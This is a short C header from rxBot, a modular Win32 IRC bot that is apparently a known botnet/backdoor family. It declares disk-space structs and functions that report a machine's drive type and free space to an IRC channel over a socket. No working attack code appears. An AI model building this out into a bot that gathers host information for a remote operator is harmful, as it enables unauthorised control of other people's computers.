/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

typedef struct DKSP
{
	__int64 AvailableBytes;
	__int64 FreeBytes;
	__int64 TotalBytes;

} DKSP;

typedef struct DKSPKB
{
	char AvailableKB[128];
	char FreeKB[128];
	char TotalKB[128];
	
} DKSPKB;

BOOL FileExists(char *filename, int mode=04);
const char *commaI64(unsigned __int64 number);
const char *DriveType(LPCSTR Drive);
DKSP DiskSpace(LPCSTR Drive);
DKSPKB DiskSpaceKB(LPCSTR Drive);
void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
